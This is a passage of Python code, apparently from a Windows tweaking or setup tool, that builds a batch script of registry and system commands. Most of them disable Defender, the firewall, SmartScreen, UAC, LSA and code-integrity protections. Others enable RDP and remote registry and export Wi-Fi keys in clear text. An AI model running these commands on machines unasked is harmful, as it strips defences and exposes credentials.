            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v limitblankpassworduse /d 0 /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /t REG_DWORD /v DisableNotifications /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /t REG_DWORD /v DisableEnhancedNotifications /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Systray" /t REG_DWORD /v HideSystray /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v DisableClearTpmButton /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v DisableTpmFirmwareUpdateWarning /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v HideTPMTroubleshooting /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v DisableEnhancedNotifications /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Account protection" /t REG_DWORD /v UILockdown /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection" /t REG_DWORD /v UILockdown /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device performance and health" /t REG_DWORD /v UILockdown /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Family options" /t REG_DWORD /v UILockdown /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v UILockdown /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Firewall and network protection" /t REG_DWORD /v UILockdown /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Virus and threat protection" /t REG_DWORD /v UILockdown /d 0 /f'
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy"
            + chr(34)
            + " /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"
            + chr(34)
            + " /v Enabled /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\KernelShadowStacks"
            + chr(34)
            + " /v Enabled /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend"
            + chr(34)
            + " /v Start /t REG_DWORD /d 4 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc"
            + chr(34)
            + " /v Start /t REG_DWORD /d 4 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService"
            + chr(34)
            + " /v Start /t REG_DWORD /d 4 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\wscsvc"
            + chr(34)
            + " /v Start /t REG_DWORD /d 4 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
            + chr(34)
            + " /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
            + chr(34)
            + " /v DisableAntiVirus /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
            + chr(34)
            + " /v PUAProtection /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
            + chr(34)
            + " /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
            + chr(34)
            + " /v DisableIOAVProtection /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
            + chr(34)
            + " /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
            + chr(34)
            + " /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
            + chr(34)
            + " /v ScanScheduleDay /t REG_DWORD /d 8 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
            + chr(34)
            + " /v DisableRemovableDriveScanning /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
            + chr(34)
            + " /v DisableScanningNetworkFiles /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
            + chr(34)
            + " /v DisableScanningMappedNetworkDrivesForFullScan /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
            + chr(34)
            + " /v DisableCatchupQuickScan /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
            + chr(34)
            + " /v DisableCatchupFullScan /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS"
            + chr(34)
            + " /v DisableNIS /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet"
            + chr(34)
            + " /v MAPSReporting /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet"
            + chr(34)
            + " /v SubmitSamplesConsent /t REG_DWORD /d 2 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting"
            + chr(34)
            + " /v DisableGenericRePORTs /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection"
            + chr(34)
            + " /v EnableNetworkProtection /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access"
            + chr(34)
            + " /v EnableControlledFolderAccess /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR"
            + chr(34)
            + " /v ExploitGuard_ASR_Rules /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
            + chr(34)
            + " /v HideSCAHealth /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer"
            + chr(34)
            + " /v SmartScreenEnabled /t REG_SZ /d "
            + chr(34)
            + "Off"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost"
            + chr(34)
            + " /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
            + chr(34)
            + " /v SmartScreenEnabled /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
            + chr(34)
            + " /v SmartScreenPuaEnabled /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
            + chr(34)
            + " /v SmartScreenForTrustedDownloadsEnabled /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
            + chr(34)
            + " /v SmartScreenDnsRequestsEnabled /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"
            + chr(34)
            + " /v EnableFirewall /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"
            + chr(34)
            + " /v EnableFirewall /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile"
            + chr(34)
            + " /v EnableFirewall /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"
            + chr(34)
            + " /v DisableNotifications /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"
            + chr(34)
            + " /v DisableNotifications /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile"
            + chr(34)
            + " /v DisableNotifications /t REG_DWORD /d 1 /f"
            + chr(10)
            + "assoc .bat=batfile"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v RunAsPPL /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v RunAsPPLBoot /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v VerboseStatus /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Psched /t REG_DWORD /v NonBestEffortLimit /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /t REG_DWORD /v EnableSmartScreen /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Psched /t REG_DWORD /v AllowEdgeSwipe /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\EdgeUI /t REG_DWORD /v AllowEdgeSwipe /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\EdgeUI /t REG_DWORD /v DisableHelpSticker /d 1 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /t REG_DWORD /v DisableRealtimeMonitoring /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /t REG_DWORD /v DisableNotifications /d 1 /f'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v ClearRecentDocsonExit /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v ShowOrHideMostUsedApps /d 2 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedSection /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v DisableSearchBoxSuggestions /d 1 /f"
            + chr(10)
            + (
                f"reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v TaskbarNoPinnedList /d {"1" if os.path.isfile(TaskbarNoPinnedList) else "0"} /f"
            )
            + chr(10)
            + (
                f"reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v TaskbarNoPinnedList /d {"1" if os.path.isfile(TaskbarNoPinnedList) else "0"} /f"
            )
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedPersonalizedSites /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecentlyAddedApps /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\StorageSense /t REG_DWORD /v AllowStorageSenseGlobal /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoStartMenuMFUprogramsList /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v ClearRecentDocsonExit /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t reg_dword /v Start_TrackDocs /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t reg_dword /v Start_TrackDocs /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v ShowOrHideMostUsedApps /d 2 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedSection /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v DisableSearchBoxSuggestions /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedPersonalizedSites /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecentlyAddedApps /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\StorageSense /t REG_DWORD /v AllowStorageSenseGlobal /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoStartMenuMFUprogramsList /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\TaskbarDeveloperSettings /t REG_DWORD /v TaskbarEndTask /d 1 /f"
            + chr(10)
            + f"reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v AutoCheckSelect /d {"1" if os.path.isfile(AutoCheckSelect) else "0"} /f"
            + chr(10)
            + f"reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v AutoCheckSelect /d {"1" if os.path.isfile(AutoCheckSelect) else "0"} /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v ShowSuperHidden /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v ShowSuperHidden /d 1 /f"
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /t REG_DWORD /v DisableAntiSpyware /d 1 /f'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoAutorun /d 1 /f"
            + chr(10)
            + 'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations /t REG_SZ /v LowRiskFileTypes /d ".avi;.bat;.cmd;.exe;.htm;.html;.lnk;.mpg;.mpeg;.mov;.mp3;.mp4;.mkv;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;.7z;.rar;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY;.PYW" /f'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments /t REG_DWORD /v ScanWithAntiVirus /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\DownloadManager /t REG_DWORD /v ComplDlgShowing /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\DownloadManager /t REG_DWORD /v StartDlgShowing /d 0 /f"
            + chr(10)
            + "powershell -command \" (gci 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings' -Recurse).Name -notmatch '\\bDefaultPowerSchemeValues|(\\[0-9]|\\b255)$' | % {sp $_.Replace('HKEY_LOCAL_MACHINE','HKLM:') -Name 'Attributes' -Value 2 -Force}\""
            + chr(10)
            + 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" /v Enabled /t REG_DWORD /d 1 /f'
            + chr(10)
            + 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config" /v AnnounceFlags /t REG_DWORD /d 5 /f'
            + chr(10)
            + install_wim_tweak_exe
            + " /o /l"
            + chr(10)
            + install_wim_tweak_exe
            + ' /o /c "Windows-Defender" /r'
            + chr(10)
            + install_wim_tweak_exe
            + " /h /o /l"
            + chr(10)
            + 'regsvr32 /s "%s"' % LockHunter_dll
            + chr(10)
            + 'for /f "delims=" %%i in (\'reg query HKEY_CURRENT_USER\\Software\\DownloadManager\\FoldersTree\') do (reg add "%%i" /t REG_NONE /v pathW /d "%DesktopPath%" /f'
            + chr(10)
            + 'reg add "%%i" /t REG_DWORD /v rememberLastPath /d 0 /f)'
            + chr(10)
            + 'reg add HKEY_CURRENT_USER\\Software\\DownloadManager /t REG_NONE /v LocalPathW /d "%DesktopPath%" /f'
            + chr(10)
            + 'reg add "HKCU\\SOFTWARE\\Policies\\Microsoft\\Edge" /v DownloadDirectory /t REG_SZ /d "%DesktopPath%" /f'
            + chr(10)
            + 'reg add "HKCU\\SOFTWARE\\Policies\\Microsoft\\Edge" /v PromptForDownloadLocation /t REG_SZ /d 0 /f'
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\DownloadManager /t REG_DWORD /v RememberLastSave /d 0 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting" /t REG_DWORD /v DontShowUI /d 1 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting" /t REG_DWORD /v Disabled /d 1 /f'
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard /v EnableVirtualizationBasedSecurity /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard /v RequirePlatformSecurityFeatures /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v LsaCfgFlags /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard /t REG_DWORD /v LsaCfgFlags /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
            + chr(34)
            + " /t REG_DWORD /v fDenyTSConnections /d 0 /f"
            + chr(10)
            + 'reg add "HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys" /t reg_sz /v Flags /d 26 /f'
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
            + chr(34)
            + " /t REG_DWORD /v fSingleSessionPerUser /d 1 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
            + chr(34)
            + " /t REG_DWORD /v MaxInstanceCount /d 32768 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /t REG_DWORD /v KeepAliveEnable /d 1 /f'
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters"
            + chr(34)
            + " /t REG_DWORD /v AllowEncryptionOracle /d 2 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
            + chr(34)
            + " /t REG_DWORD /v fDenyTSConnections /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
            + chr(34)
            + " /t REG_DWORD /v fSingleSessionPerUser /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
            + chr(34)
            + " /t REG_DWORD /v MaxInstanceCount /d 32768 /f"
            + chr(10)
            + "sc config remoteregistry start=auto"
            + chr(10)
            + "sc start remoteregistry"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
            + chr(34)
            + " /t REG_DWORD /v "
            + chr(34)
            + ProtectDir
            + chr(34)
            + " /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"
            + chr(34)
            + " /t REG_DWORD /v "
            + chr(34)
            + ProtectExe
            + chr(34)
            + " /d 0 /f"
            + chr(10)
            + "schtasks /delete /f /tn FRAPS"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
            + chr(34)
            + " /t REG_DWORD /v "
            + chr(34)
            + WindowsDir
            + chr(34)
            + " /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {645FF040-5081-101B-9F08-00AA002F954E} /d 1 /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f"
            + chr(10)
            + "regini "
            + chr(34)
            + reginifile
            + chr(34)
            + chr(10)
            + "bcdedit /set {bootmgr} displaybootmenu no"
            + chr(10)
            + 'copy /Y "'
            + SnapShotExe
            + '" %datadir%:\\Important\\System_Backup\\Tool.exe'
            + chr(10)
            + "systray"
            + chr(10)
            + "rd /s /q %systemdrive%\\$RECYCLE.BIN >>nul"
            + chr(10)
            + "rd /s /q"
            + " "
            + datadir
            + ":\\$RECYCLE.BIN >>nul"
            + chr(10)
            + "netsh wlan export profile key=clear folder=%datadir%:\\StorageRedirect\\Wlansvc\\"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v WifiMaxPeers /d 128 /f"
            + chr(10)
            + "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v NukeOnDelete /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v NukeOnDelete /t REG_DWORD /d 1  /f"
            + chr(10)
            + f"reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d {"0" if os.path.isfile(DisableLUA) else "1"} /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f"
            + chr(10)
